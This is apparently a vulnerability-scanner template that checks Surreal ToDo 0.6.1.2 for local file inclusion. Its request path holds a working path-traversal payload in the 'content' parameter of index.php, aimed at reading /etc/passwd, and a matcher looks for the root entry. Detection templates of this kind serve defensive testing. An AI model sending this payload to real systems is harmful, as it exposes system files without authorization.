id: surrealtodo-lfi
info:
  author: arafatansari
  description: 'Surreal ToDo is affected by Local File Inclusion on index.php via
    content parameter.

    '
  metadata:
    verified: true
  name: Surreal ToDo 0.6.1.2 - Local File Inclusion
  reference:
  - https://www.exploit-db.com/exploits/45826
  severity: high
  tags: surreal,lfi
requests:
- matchers:
  - regex:
    - root:[x*]:0:0
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/index.php?content=../../../../../../../../etc/passwd'
